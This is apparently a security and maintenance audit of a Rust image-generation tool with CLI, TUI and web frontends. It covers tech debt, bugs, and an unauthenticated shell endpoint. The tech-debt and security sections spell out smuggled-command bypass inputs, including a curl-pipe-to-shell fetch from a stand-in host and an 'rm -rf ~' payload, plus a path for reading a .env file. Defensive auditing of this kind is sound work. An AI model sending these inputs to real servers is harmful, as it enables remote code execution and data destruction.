---
last_mapped_commit: f37fbe5c1e16138cf0fbfaf77157b2e28b0f2a9c
last_mapped_at: 2026-10-03
---
# Codebase Concerns

**Analysis Date:** 2026-10-03

## Tech Debt

**Web `/api/generate-cli` allowlist is a false guarantee:**

- Issue: The endpoint runs arbitrary strings through `sh -c` after a prefix check: `command.trim_start().starts_with("imagai")` (`src/web.rs:237-261`). Anything beginning with `imagai` passes — e.g. `imagai; curl evil.sh | sh`, `imagai $(whoami)`, `imagai --prompt x; rm -rf ~`. Shell metacharacters are never stripped or rejected. `README.md:129` documents this as a security property ("only accepts commands that begin with `imagai`"), so the guarantee is both false and advertised.
- Files: `src/web.rs:237-261`, `README.md:104,129`, `tests/web.rs:216-229`
- Impact: Remote code execution as the server user for anyone who can reach the port (see Security Considerations #1/#2).
- Fix approach: Delete the endpoint (the bundled UI never calls it — `web_interface.html` only fetches `/api/generate` and `/api/engines`), or replace `sh -c` with `tokio::process::Command::new("imagai")` + argv vector built from validated fields, and drop the shell entirely.

**Dead / stale code in the web UI:**

- Issue: `buildCliCommand()` (`web_interface.html:575-621`) is defined but never invoked, and builds `rye run imagai generate …` — a Python/rye leftover whose output would not even pass the server allowlist. The `input_image` upload path is also dead (see Known Bugs #7).
- Files: `web_interface.html:575-621`, `web_interface.html:647-649`, `src/web.rs:61-63,176-179`
- Impact: Misleading UI surface; reviewers assume CLI-proxy and vision-upload features exist.
- Fix approach: Remove `buildCliCommand` and the upload widget, or wire them to a real (non-shell) endpoint.

**Errors carried as strings instead of `Result`:**

- Issue: The generation pipeline returns `Vec<ImageGenerationResponse>` where failures are `Option<String>` fields (`src/models.rs:44-53`); `provider::generate_images` never returns `Err` (`src/provider.rs:120-234`). Every caller re-inspects `result.error` by string (`src/cli.rs:235-244`, `src/tui.rs:341-353`, `src/web.rs:199-227`).
- Files: `src/models.rs:44-53`, `src/provider.rs:120-234`, `src/core.rs:29-34`
- Impact: No typed error taxonomy → retryable (429/5xx) vs. permanent (bad key) cannot be distinguished, so no retry/backoff is possible without a refactor.
- Fix approach: Introduce an `enum GenerationError { Http { status }, Parse, Save { path }, … }` and convert at the provider boundary.

**Save failures lose their root cause:**

- Issue: `save_image_from_url(...).ok()` / `save_image_from_b64(...).ok()` discard the underlying error; the caller then fabricates `Failed to save image to {path:?}` (`src/core.rs:87-114`).
- Files: `src/core.rs:87-114`
- Impact: Disk-full, permission, and decode errors are all indistinguishable in CLI/TUI/web output.
- Fix approach: Propagate the error: `match … { Err(e) => api_response.error = Some(format!("failed to save: {e}")) }`.

**Mixed error-handling styles in the CLI:**

- Issue: `cmd_generate` both returns `anyhow::Result` and calls `std::process::exit(1)` directly (`src/cli.rs:144,174,184,233-273`).
- Files: `src/cli.rs:132-273`
- Impact: `process::exit` skips destructors and any future cleanup (terminal restore, flush); behavior differs per failure class.
- Fix approach: Return `Err` and let `main` (`src/main.rs:7-11`) set the exit code.

**Config load has filesystem side effects:**

- Issue: `Settings::load()` calls `create_dir_all(output_dir)` and prints warnings on failure (`src/config.rs:88-91`) — merely reading config creates directories.
- Files: `src/config.rs:39-94`
- Impact: Surprising for `list-engines`, tests, and any future library consumer.
- Fix approach: Move directory creation to the save path (`src/utils.rs:208-218` already does `create_dir_all`).

**Repo hygiene:**

- Issue: `.gitignore` is modified but uncommitted; 12 untracked entries include `.mcp.json` (may contain MCP credentials), `.adal/`, `.claude/`, `.cursor/`, `.gemini/`, `.grok/`, `.kiro/`, `.windsurf/`, `AGENTS.md`, `GEMINI.md`, `opencode.json`. `AGENTS.md` tells agents to use `graft/`, but `graft/` is gitignored — the graph is a local-only cache that other clones will not have.
- Files: `.gitignore`, `AGENTS.md`, `opencode.json`, `.mcp.json` (existence only — contents not read)
- Impact: Accidental commit of editor/MCP config; onboarding docs point at a nonexistent-in-clone artifact.
- Fix approach: Commit `.gitignore`, add `.mcp.json` and editor dirs to it (or commit the intended ones), and note that `graft build` must be run locally.

## Known Bugs

**Generation failures exit 0:**

- Symptoms: `imagai generate` prints `[Error] …` but the process exits 0, so scripts/CI cannot detect failure.
- Files: `src/cli.rs:235-273` (loop prints errors, then `Ok(())`); `src/main.rs:7-11`
- Trigger: Any API error, save failure, or missing image payload.
- Workaround: Parse stderr text.
- Note: `tests/cli.rs:278-291` (`generate_reports_api_errors`) asserts `.success()`, encoding the wrong behavior as expected.

**`sanitize_filename` panics on non-ASCII filenames over 100 bytes:**

- Symptoms: `byte index 100 is not a char boundary` panic.
- Files: `src/utils.rs:31-33` (`s.truncate(100)`), reached from `src/utils.rs:163`
- Trigger: `--auto-filename` where the LLM returns a name containing multi-byte UTF-8 (CJK, emoji) whose 100-byte cut splits a character. ASCII-only is covered by `tests/utils` unit test at `src/utils.rs:300`.
- Workaround: None — it panics before the fallback name is produced.
- Fix approach: Truncate by chars: `s.char_indices().take_while(|(i,_)| *i < 100).last()…` or `s.truncate(s.floor_char_boundary(100))` (nightly) / manual.

**`truncate()` panics while formatting API errors:**

- Symptoms: Panic inside the error path when an upstream error body contains multi-byte UTF-8 straddling the cut.
- Files: `src/provider.rs:445-451` (`&s[..max]`), called at `src/provider.rs:30,111,194,348`
- Trigger: A non-ASCII error message (many gateways return localized/UTF-8 text) longer than 400–500 bytes with a split at byte 400/500.
- Workaround: None.
- Fix approach: Byte-safe cut: `&s[..s.floor_char_boundary(max)]` equivalent helper.

**PNG metadata injection can emit a malformed tEXt chunk:**

- Symptoms: File saved but rejected by PNG viewers / metadata silently lost.
- Files: `src/utils.rs:234-273`
- Trigger: Prompts containing NUL bytes (tEXt data must not contain `\0`) or non-Latin-1 characters (tEXt is ISO-8859-1). Only the stdin prompt path strips control chars (`src/cli.rs:157-170`); `--prompt` args (`src/cli.rs:51-52`) and web payloads (`src/web.rs:29`) are not sanitized. Malformed chunk lengths also make `inject_png_metadata` silently return the input unchanged (`src/utils.rs:239-252`).
- Fix approach: Encode Latin-1-replaceable text, fall back to `iTXt`/UTF-8, or skip injection when the prompt contains `\0` or non-Latin-1.

**`/api/images` reports fake creation time:**

- Symptoms: `created` equals `modified` for every file; sorting by "created" is really mtime order.
- Files: `src/web.rs:360-361` (`created_iso` and `modified_iso` both use `modified`)
- Trigger: Any listing call.
- Fix approach: Read `meta.created()` when available and keep mtime for `modified`.

**`generate-cli` attributes unrelated files to the command:**

- Symptoms: Response includes images the command did not produce.
- Files: `src/web.rs:288-314` plus the 300-second "recent" heuristic at `src/web.rs:421-432`
- Trigger: Any PNG written into `output_dir` within the last 5 minutes (e.g. a concurrent `/api/generate`).
- Fix approach: Snapshot the directory before running the command and diff after.

**Web image upload is a no-op:**

- Symptoms: Uploading an image in the UI changes nothing; no image-to-image generation occurs.
- Files: `web_interface.html:647-649` sends `input_image`; `src/web.rs:176-179` stores it under key `input_image`; `src/provider.rs:311-317` only reads `image_url`. The comment at `src/web.rs:61` and `src/web.rs:177` admits it is "accepted but not consumed".
- Fix approach: Either map `input_image` → `image_url` in `src/web.rs:176-179`, or remove the upload widget.

**Minor dead code:**

- `src/tui.rs:665-685` builds `row` then discards it (`let _ = row;`).
- `src/tui.rs:366` and `src/tui.rs:395` both handle quit; the first arm makes the second unreachable for `'q'`.
- `src/provider.rs:289` `let _ = config;` — parameter unused by `build_images_body`.

## Security Considerations

**RCE surface on the web server (highest priority):**

- Risk: `/api/generate-cli` executes attacker-controlled shell input (Tech Debt #1) while the server binds `0.0.0.0` by default (`src/cli.rs:41-45`) and applies `CorsLayer::allow_origin(Any).allow_methods(Any).allow_headers(Any)` (`src/web.rs:92-95`) with no authentication, token, or rate limit on any route (`src/web.rs:96-105`). A malicious web page open in the victim's browser can POST to `http://localhost:5000/api/generate-cli` (CORS `Any` permits the preflight), and any host on the LAN can reach the port directly.
- Files: `src/web.rs:92-105,237-261`, `src/cli.rs:39-46`
- Current mitigation: Prefix string check only (bypassable); `/api/generate-cli` is not referenced by the bundled UI.
- Recommendations: Default `--host 127.0.0.1`; remove or hard-disable the shell endpoint; restrict CORS to the same origin; require a local token header for all `POST` routes.

**Unauthenticated credit/cost theft:**

- Risk: `/api/generate` has no auth, no rate limit, and `n` is unbounded (`src/web.rs:33-34,185`, `src/cli.rs:62-64`, `src/tui.rs:301`), so any reachable client can queue unlimited paid generations.
- Files: `src/web.rs:136-196`, `src/cli.rs:62-64`
- Current mitigation: None.
- Recommendations: Cap `n` (e.g. `n.clamp(1, 4)`), add a simple concurrency limiter, and bind to loopback by default.

**Write-side path traversal:**

- Risk: `output` / `-o` is joined into `output_dir` verbatim: `settings.output_dir.join(&current_filename)` — `../../x.png` or an absolute path escapes the output directory and overwrites arbitrary files with image bytes.
- Files: `src/core.rs:45-73`, `src/utils.rs:208-231`; input sources `src/web.rs:184` (`payload.output`), `src/cli.rs:59-60`
- Current mitigation: Read side is protected — `serve_image` reduces to the final path component (`src/web.rs:384-388`) and `tests/web.rs:202-213` covers traversal on reads. Write side has no check and no test.
- Recommendations: Reject `output` values containing separators or `..`, or canonicalize and assert the result stays under `output_dir`.

**`serve_image` has no extension allowlist:**

- Risk: Any file physically inside `output_dir` can be read by name (`src/web.rs:380-396`), unlike `/api/images` which filters to image extensions (`src/web.rs:341`). If `IMAGAI__OUTPUT_DIR` is pointed at the repo root (or `.`, a legitimate config), `GET /api/images/.env` serves secrets. `content_type_for` falls back to `application/octet-stream` (`src/web.rs:406-419`) rather than refusing.
- Files: `src/web.rs:380-396,406-419`, `src/config.rs:80-81`
- Current mitigation: Filename reduced to final component (blocks `..` traversal); directory listing filters extensions.
- Recommendations: Apply the same `IMAGE_EXTENSIONS` allowlist in `serve_image`.

**Secret handling:**

- Risk: API keys live as plain `String` on `#[derive(Debug, Clone)]` structs — a future `{:?}`/`anyhow` context that includes `Settings`/`EngineConfig` would print keys. Keys are loaded from `.env` at cwd or repo root plus every `IMAGAI__ENGINES__*__API_KEY` env var (`src/config.rs:46-86`), so they are visible in `/proc/<pid>/environ` on Linux. `PLACEHOLDER_KEY = "YOUR_OPENAI_API_KEY"` is a fixed sentinel (`src/config.rs:5,17-19`), and engine entries are created with `api_key: "dummy"` when only a non-key field is set (`src/config.rs:68-72`) — harmless today but three ways to spell "not configured".
- Files: `src/config.rs:5-19,46-86`, `Cargo.toml` (no keychain/zeroize dependency)
- Current mitigation: `.env` and `*.env` are gitignored (`.gitignore`); only `.env.example` is tracked; `/api/engines` never returns `api_key` (`src/web.rs:115-134`); `list-engines` prints only set/not-set (`src/cli.rs:293-315`). Repo scan found no tracked secrets.
- Recommendations: Remove `Debug` from `EngineConfig`/`Settings` (or redact `api_key` in a manual `Debug` impl); keep `.env` out of `output_dir`.

**Embedded image metadata is prompt data:**

- Risk: Saved PNGs contain the full prompt and model name as `tEXt` chunks (`src/utils.rs:233-273`), so images shared externally leak prompts; `generated_images/` (gitignored) accumulates them locally.
- Files: `src/utils.rs:233-273`, `.gitignore` (`/generated_images`)
- Recommendations: Document the behavior (README.md:16 mentions it) and offer a `--no-metadata` flag if prompts are sensitive.

## Performance Bottlenecks

**A new HTTP client per request:**

- Problem: `provider::http_client()` builds a fresh `reqwest::Client` on every call — once per generation (`src/provider.rs:145`), once per model fetch (`src/provider.rs:21,91`), and once per saved image *inside the result loop* (`src/core.rs:78-85`).
- Files: `src/provider.rs:12-17`, `src/core.rs:78-85`
- Cause: No shared/pooled client; each build loses connection pooling and repeats TLS handshakes.
- Improvement path: Build one `Client` at startup (e.g. in `Settings`/`AppState`) and pass `&Client` down.

**No outbound HTTP timeout:**

- Problem: The client has no `.timeout()` (`src/provider.rs:12-17`); a stalled upstream hangs `imagai generate`, the TUI "Working…" state (`src/tui.rs:241-265`), and an open `/api/generate` response indefinitely. Only `/api/generate-cli` has a 300s timeout (`src/web.rs:254-261`).
- Files: `src/provider.rs:12-17`, `src/tui.rs:241-265`, `src/web.rs:136-235`
- Improvement path: `.timeout(Duration::from_secs(120))` on the builder, plus `.connect_timeout(...)`.

**Base64 images round-tripped through JSON:**

- Problem: `/api/generate` re-reads each saved file and base64-encodes it into the response (`src/web.rs:208-215`); `generate-cli` does the same for every PNG from the last 5 minutes (`src/web.rs:288-314`).
- Files: `src/web.rs:208-215,288-314`
- Cause: Full image bytes held in memory 3× (file, raw bytes, base64 string) with no size cap or streaming; `n` is unbounded.
- Improvement path: Return `/api/images/<filename>` URLs instead of inline data, or cap/resize previews.

**TUI redraws at a fixed 10 fps:**

- Problem: The event loop draws the whole frame before every 100 ms poll (`src/tui.rs:924-932`) regardless of change.
- Files: `src/tui.rs:924-932`
- Improvement path: Redraw only on event/state change or when a generation result lands.

**Full directory scan on `/api/images`:**

- Problem: Every listing reads metadata for every file with no pagination or cache (`src/web.rs:327-378`).
- Files: `src/web.rs:327-378`
- Improvement path: Paginate (`?offset=&limit=`) once the output dir can hold thousands of files.

## Fragile Areas

**`src/tui.rs` (964 lines, zero tests):**

- Files: `src/tui.rs:17-28` (row constants), `src/tui.rs:178-237` (`text_field` / `text_field_mut` / `bool_field` / `row_label`), `src/tui.rs:442-453`
- Why fragile: Row behavior is spread across four `match` blocks keyed on positional constants; `text_field_mut` ends in `unreachable!()` (`src/tui.rs:200`), so adding a row to `text_field` but not `text_field_mut` panics at runtime. The editor uses byte-indexed cursors (`src/tui.rs:45-107`) — correct today, but any edit that moves `cursor` off a char boundary panics in `content.insert`/`remove`.
- Safe modification: Keep the four matches in lockstep; add a unit test per row asserting `text_field`, `text_field_mut`, `bool_field`, and `row_label` agree.
- Test coverage: None.

**Provider routing by substring matching:**

- Files: `src/provider.rs:128-135` (`base_url.contains("openrouter.ai")`), `src/provider.rs:135` (`model.contains("gemini")`), `src/provider.rs:256` (`model.contains("dall-e-3")`), `src/provider.rs:261` (`model.contains("stability")`), `src/provider.rs:279` (`contains("sd3")`), `src/provider.rs:319` (`model.contains("image")`)
- Why fragile: Request shape is decided by substrings, so `dall-e-3-snapshot` or a gateway base URL containing `openrouter.ai` silently changes the body/route; `stability` and `dall-e-3` branches are not mutually exclusive for a model named `stability-dall-e-3`.
- Safe modification: Route on an explicit per-engine `kind` field in `EngineConfig` (`src/config.rs:8-13`) instead of substring sniffing; until then, add a test for every new model id before shipping it.

**Image-model heuristic:**

- Files: `src/cli.rs:397-415` (12 hardcoded substrings), used by `src/cli.rs:331` and `src/tui.rs:790`
- Why fragile: New model ids fall through (`flux`, `imagen` already special-cased) and text models containing `-image`/`image-` are misclassified; TUI filters fetched models through it unconditionally, hiding models from the user (`src/tui.rs:788-793`).
- Safe modification: Treat it as a display filter only; never gate request routing on it.

**Mock server routes by path substring:**

- Files: `tests/common/mod.rs:116-126`
- Why fragile: `path.contains("models")` / `contains("images/generations")` means tests pass even if the client composes URLs incorrectly (e.g. double `/v1`), hiding real `resolve_url` bugs (`src/provider.rs:71-80`).
- Safe modification: Assert exact request paths in at least one test per endpoint.

**`render_value_line` / cursor math:**

- Files: `src/tui.rs:886-913`
- Why fragile: Splits `content` at `cursor` with `split_at` — panics if `cursor` is not a char boundary. Callers pass `self.editor.cursor` (`src/tui.rs:566-571`) and `content.len()` for non-editing render; safe today, but any refactor that mixes byte offsets with char counts breaks it.
- Safe modification: Keep cursor construction confined to `Editor` (`src/tui.rs:45-107`).

## Scaling Limits

**Cost / request size:**

- Current capacity: `n` accepts any `u32` (`src/cli.rs:62-64`, `src/tui.rs:301` parses freely, `src/web.rs:33-34` only enforces `.max(1)`).
- Limit: A single request can ask for millions of paid images; there is no concurrency cap, so parallel requests multiply it.
- Scaling path: Clamp `n` per surface, serialize generations behind a semaphore.

**Output directory:**

- Current capacity: `/api/images` linearly stats every file (`src/web.rs:327-378`); `generate-cli` base64-encodes every PNG modified in the last 5 minutes (`src/web.rs:288-314`).
- Limit: Thousands of files ⇒ slow listings and multi-megabyte JSON responses.
- Scaling path: Pagination + inline-data cap.

**TUI log buffer:**

- Current capacity: 500 lines (`src/tui.rs:168-174`), no scrollback.
- Limit: Older output is silently dropped; long generations lose early diagnostics.
- Scaling path: Ring buffer with scroll keys if debugging value warrants it.

**In-flight work:**

- Limit: No cancellation — the TUI only flips `generating` (`src/tui.rs:241-245`) and `q` exits while a spawned task keeps burning credits until process exit (`src/tui.rs:261-264`); web requests cannot be aborted server-side either.
- Scaling path: `CancellationToken` shared by CLI/TUI/web.

## Dependencies at Risk

**No CI or automated auditing:**

- Risk: There is no `.github/` (or other CI config) — tests, `cargo clippy`, and `cargo fmt` run only when someone remembers. No `cargo-audit`/`cargo-deny` configuration exists, so advisories are not surfaced.
- Files: repository root (no `.github/`), `Cargo.toml`
- Impact: Regressions and vulnerable dependencies land silently; `tests/cli.rs` spawns the real binary, so CI would also be the only guard on cross-platform behavior.
- Migration plan: Add a workflow running `cargo fmt --check`, `cargo clippy --all-targets -- -D warnings`, `cargo test`, `cargo audit`. (As of 2026-10-03: 51 tests pass, clippy and fmt are clean.)

**One binary ships three frontends:**

- Risk: `Cargo.toml` has no feature flags — CLI-only users compile and link axum + tower-http + ratatui + crossterm (`Cargo.toml:14-30`), growing binary size and attack surface (the web routes exist even if unused).
- Files: `Cargo.toml:14-30`, `src/cli.rs:123-130`
- Migration plan: Gate `web` and `tui` behind cargo features if distribution size/security matters.

**Pinned-by-lockfile modern stack:**

- Risk: `reqwest 0.13` with `default-features = false` + `rustls`/`webpki-roots`, `axum 0.8`, `ratatui 0.30`, `crossterm 0.29` (`Cargo.toml:15-30`). Direct dep graph is 22 crates (`cargo tree --depth 1`); no duplicated-version problems beyond ratatui's internal `hashbrown` pair.
- Impact: Low today (`Cargo.lock` committed, build clean); main exposure is the absence of advisory scanning above.
- Migration plan: Keep lockfile committed; add `cargo audit` in CI.

**`graft/` graph divergence:**

- Risk: `graft/` is gitignored (`.gitignore` uncommitted change) while `AGENTS.md` instructs agents to query it — clones get stale or missing guidance.
- Files: `.gitignore`, `AGENTS.md`, `graft/INDEX.md`
- Migration plan: Document `graft build` as a required local step, or commit the graph.

## Missing Critical Features

**Web authentication / origin protection:**

- Problem: No token, no origin check, wide-open CORS, loopback not the default.
- Blocks: Any safe LAN or shared-machine deployment; today `imagai web` must be treated as localhost-only by convention, not by construction.
- Files: `src/web.rs:92-105`, `src/cli.rs:39-46`

**Retries with backoff:**

- Problem: 429/5xx from providers are surfaced as immediate errors (`src/provider.rs:192-199`); no retry, no `Retry-After` handling.
- Blocks: Reliable use against rate-limited image APIs.
- Files: `src/provider.rs:166-199` (depends on the "Errors carried as strings" refactor above)

**Machine-readable output:**

- Problem: CLI output is human-formatted colored text only (`src/cli.rs:235-272`); no `--json`.
- Blocks: Scripting/automation against the CLI (the web API is JSON, the CLI is not).
- Files: `src/cli.rs:235-272`

**Graceful shutdown for the web server:**

- Problem: `axum::serve` runs without a shutdown signal (`src/web.rs:470-477`); Ctrl+C kills mid-request work (including paid generations).
- Files: `src/web.rs:470-477`

**Structured logging:**

- Problem: `println!`/`eprintln!` only (`src/cli.rs`, `src/provider.rs:158-163,328-335`, `src/config.rs:90`); `--verbose` dumps bodies to stderr with no levels or timestamps.
- Blocks: Diagnosing production issues and any audit trail for who spent credits.
- Files: `src/provider.rs:157-164`, `src/utils.rs:130-137`

**Cancellation and progress for long generations:**

- Problem: No way to abort an in-flight generation from TUI or web; no streaming progress (only before/after states).
- Files: `src/tui.rs:241-265`, `src/web.rs:136-235`

## Test Coverage Gaps

**TUI (highest risk, zero coverage):**

- What's not tested: All 964 lines of `src/tui.rs` — row/focus navigation, editor byte-cursor operations, `build_request` validation, generation task lifecycle, model fetch.
- Files: `src/tui.rs`
- Risk could break unnoticed: Row-constant drift triggers `unreachable!()` panic (`src/tui.rs:200`); editor cursor corruption panics on `String::insert`.
- Priority: High — extract pure helpers (`build_request`, `Editor`, `render_value_line`) into unit-testable functions.

**Security paths:**

- What's not tested: `/api/generate-cli` allowlist bypass (`imagai; …`), write-side `output` traversal, `serve_image` extension policy, default bind host.
- Files: `tests/web.rs:216-229` (only checks `rm -rf /`), `tests/web.rs:202-213` (read traversal only)
- Risk could break unnoticed: RCE or arbitrary write reintroduced/regressed silently.
- Priority: High.

**Failure exit codes:**

- What's not tested: Non-zero exit when generation fails; instead `tests/cli.rs:278-291` asserts success on API error.
- Files: `src/cli.rs:235-273`, `tests/cli.rs:277-291`
- Risk could break unnoticed: Scripts keep treating failures as success; fixing the bug requires updating this test.
- Priority: High.

**Unicode/panic paths:**

- What's not tested: `sanitize_filename` with multi-byte >100 bytes (`src/utils.rs:31-33`), `truncate` with non-ASCII error bodies (`src/provider.rs:445-451`), tEXt injection with non-Latin-1/NUL prompts (`src/utils.rs:256-273`).
- Files: `src/utils.rs:275-416` (unit tests exist but are ASCII-only)
- Risk could break unnoticed: Production panics on realistic inputs.
- Priority: Medium-High.

**Web metadata and listing:**

- What's not tested: `created` vs `modified` equality (`src/web.rs:360-361`), empty/missing `output_dir`, non-image files, pagination behavior, large responses.
- Files: `src/web.rs:327-378`, `tests/web.rs:175-200`
- Priority: Medium.

**Provider routing:**

- What's not tested: Substring-routing edge cases (`stability` + `dall-e-3` in one id, base URLs containing `openrouter.ai` as a path segment are covered at `tests/cli.rs:293-314`, but not combinations), `fetch_models` lenient fallback (`src/provider.rs:45-68`), no-timeout/hang behavior.
- Files: `src/provider.rs:120-234,453-565`
- Priority: Medium.

**Current coverage snapshot (2026-10-03):** 51 tests pass — 22 lib unit, 16 CLI e2e (`tests/cli.rs`), 10 web (`tests/web.rs`), 3 core (`tests/core.rs`); `cargo clippy --all-targets` and `cargo fmt --check` are clean. No CI runs them automatically.

---

*Concerns audit: 2026-10-03*
